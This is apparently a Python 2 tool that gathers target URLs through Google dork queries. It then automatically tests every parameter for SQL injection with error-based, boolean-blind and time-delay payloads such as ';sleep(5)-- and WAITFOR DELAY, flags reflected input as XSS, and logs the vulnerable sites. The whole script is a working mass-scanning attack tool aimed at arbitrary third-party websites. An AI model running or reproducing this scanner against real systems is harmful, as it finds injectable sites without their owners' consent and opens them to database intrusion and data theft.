import argparse
from google import google
import re
from multiprocessing import Process,Pipe
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


full = False
num_page = 1
coincidences = []
path = "log.txt"

class bcolors():
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
class ActiveScanThread(Process):
    
    __patterns = ["SQL","sql","MySql","MariaDB","Unknown","BBDD","Oracle","Microsoft"]
    __types = ['Error-Based','Blind-Str','Blind-Int','Stacked-Queries-Str','Stacked-Queries-Int']
    __blindP = ["' and 'ayHj'='ayHj"," and 'ayHj'='ayHj'"]
    __blind = ["' and 'ayHj'='bjIn"," and 'ayHj'='bjIn'"]
    __blindD = ["ayHj=ayHj", "ayHj = ayHj","%27ayHj%27=%27ayHj","ayHj ayHj","ayHjayHj","'ayHj'='ayHj","'ayHj'='ayHj'","&#039;ayHj&#039;=&#039;ayHj","&#39;ayHj&#39;=&#39;ayHj","ayHjayHj"]
    __stackedInt = [";sleep(5)-- ",";WAITFOR DELAY '00:00:05'-- "]
    __stackedStr = ["';sleep(5)-- ","';WAITFOR DELAY '00:00:05'-- "]
    
    def __init__(self,url,remainder,pipe):
        self.url = url
        self.pipe = pipe
        self.remainder = remainder 
	Process.__init__(self)	
    
    def run(self):
        
        peaceful = True
        for i in range(len(self.__types)):
            try:
                if i == 1 or i == 2:
		    
		    if self.notChanging():
		        original = self.url + self.remainder
			o = self.getRawHtml(original)

			crafted1 = self.url + self.__blindP[i-1] + self.remainder
			raw1 = self.getRawHtml(crafted1)
			
			crafted2 = self.url + self.__blind[i-1] + self.remainder
			raw2 = self.getRawHtml(crafted2)
		    
			if (o == raw1) and (raw1 != raw2) and not self.discard(raw1):
			    if self.__blindP[i-1] not in raw1:
				self.injectionFound(i,self.__blindP[i-1],crafted1)
				if not full:
				    break
			    else:
				self.xssFound(crafted1)
                       
            
		elif i == 3 or i == 4:
		    
		    original = self.url + self.remainder
		    time1 = self.getElapsedTime(original)
		    found = False
		    for p in self.__stackedStr:
			crafted = self.url + p + self.remainder
			time2 = self.getElapsedTime(crafted) 
			if time2 > (time1 + 4.5):
			    found = True
			    self.injectionFound(i,p,crafted)
			    break
			
		    if found and not full:
			break
		    
		else:
		    
		    original = self.url + self.remainder
		    raw_o = self.getRawHtml(original)
		    if not self.checkPatterns(raw_o):
			crafted = self.url + "'"
			raw = self.getRawHtml(crafted)
			if self.checkPatterns(raw):
			    self.injectionFound(i,"'",crafted)
			    if not full:
				break
		    
		    
            except requests.exceptions.HTTPError as e:
		pass
            except requests.exceptions.InvalidURL as e:
                pass
            except:
                pass
            
            if self.pipe.poll():
                msg = self.pipe.recv()
                if msg == "Kill yourself.":
                    peaceful = False
                    break
        
        if peaceful: 
            self.pipe.send("End.") 
	    
    def notChanging(self):
	url = self.url + self.remainder
	r1 = self.getRawHtml(url)
	r2 = self.getRawHtml(url)
	
	return r1 == r2
    
    def clean_html(self,html):
        """
        Copied from NLTK package.
        Remove HTML markup from the given string.
    
        :param html: the HTML string to be cleaned
        :type html: str
        :rtype: str
        """
    
        # First we remove inline JavaScript/CSS:
        cleaned = re.sub(r"(?is)<(script|style).*?>.*?(</\1>)", "", html.strip())
        # Then we remove html comments. This has to be done before removing regular
        # tags since comments can contain '>' characters.
        cleaned = re.sub(r"(?s)<!--(.*?)-->[\n]?", "", cleaned)
        # Next we can remove the remaining tags:
        cleaned = re.sub(r"(?s)<.*?>", " ", cleaned)
        # Finally, we deal with whitespace
        cleaned = re.sub(r"&nbsp;", " ", cleaned)
        cleaned = re.sub(r"  ", " ", cleaned)
        cleaned = re.sub(r"  ", " ", cleaned)
        return cleaned.strip() 
    
    def getRawHtml(self,url):
        r = requests.get(url,verify=False, timeout = 5)
        return self.clean_html(r.text)   
    
    def getElapsedTime(self,url):
        time = 0.0
        for i in range(5):
            time += requests.get(url,verify=False,timeout = 20).elapsed.total_seconds()
        
        return time / 5
    
    def injectionFound(self,i,payload,url):
        self.pipe.send(url + ".[*]Type: " + self.__types[i] + ".[*]Payload: " + payload + ".") 
    
    def xssFound(self,url):
	self.pipe.send(url + ".[*]Type: XSS.[*]Payload: None.") 
    
    def discard(self,raw):
	for d in self.__blindD:
	    if d in raw:
		return True
	
	return False
    
    def checkPatterns(self,raw):
        
        for p in self.__patterns:
            if p in raw:
                return True
            
        return False
    
     
                    

def parseArguments():

    parser = argparse.ArgumentParser()
    parser.add_argument("--site", help="Domain in which look for.")
    parser.add_argument("--ext", help="Extension to look for.")
    parser.add_argument("--inurl", help="Pattern to look for.")
    parser.add_argument("--intitle", help="Title to look for")
    parser.add_argument("--path",help="Log file to store the results.")
    parser.add_argument("-f", "--full", action="store_true",help="Force the tool to test all parameters.")    
    parser.add_argument("num_pages", help="Number of Google's pages retrieved.",type=int)


    args = parser.parse_args()

    return args

def createQuery(args):

    global num_page,full

    query = ""
    if args.site:
        query += "site:" + args.site  + " "
    if args.ext:
        query += "ext:" + args.ext + " "
    if args.inurl:
        query += "inurl:" + args.inurl + " "
    if args.intitle:
        query += "intitle:" + '"' + args.intitle + '"'
    if args.path:
	path = args.path
    if args.full:
	full = True
    if args.num_pages > 1 :
        num_page = args.num_pages
    
    return query

def search(query):
    global coincidence
    print bcolors.BOLD + "Search: " + query + bcolors.ENDC
    search_results = google.search(query, num_page)
    for result in search_results:
        coincidences.append(result.link)
        
def printMsg(msg,original):
    pieces = msg.split("[*]")
    
    print bcolors.BOLD + bcolors.OKGREEN + "Possible vulnerability detected." + bcolors.ENDC
    print bcolors.OKGREEN +  pieces[1] + bcolors.ENDC
    print bcolors.OKGREEN +  pieces[2] + bcolors.ENDC
    print bcolors.OKGREEN + "Crafted url: " + pieces[0] + bcolors.ENDC
    print bcolors.OKGREEN + "Original url: " + original + "." + bcolors.ENDC
    
    with open(path,"a") as f:
	f.write(original + " --> (" + pieces[1] + ").\n")
	
    
    
def startScan():
    
    for item in coincidences:
        if (item is not None) and (len(item.split("=")) > 1):
	    print bcolors.BOLD + "Testing: " + bcolors.OKBLUE + item + bcolors.ENDC
            pieces = item.split("&")                      
            url = ""
            i = 0
            pipes = []
            for i in range(len(pieces)):
                url += pieces.pop(0)
                remainder = ""
                for p in pieces:
                    remainder += '&' + p
                parent_pipe,child_pipe = Pipe()
                scan = ActiveScanThread(url,remainder,child_pipe)
                pipes.append(parent_pipe)
		try:
		    scan.start()
		except Exception as e:
		    print e
                url += '&'
            
            exited = False
            count = 0
            msg = ""
            while not exited:
		l = len(pipes)
                for i in range(l):
                    pipe = pipes[0]
                    if pipe.poll():
                        msg = pipe.recv()
                        if msg == "End.":
                            count += 1
			    if count == l:
				exited = True
                        else:
			    if not full:
				for p in pipes:
				    p.send("Kill yourself.")
				exited = True   
			    
                    pipe = pipes.pop(0)
		    pipes.append(pipe)
            
            if msg != "End.":               
		printMsg(msg,item)
		
            

def main():
    
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)    
    args = parseArguments()
    query = createQuery(args)
    search(query)
    startScan()

if __name__ == "__main__":

    main()
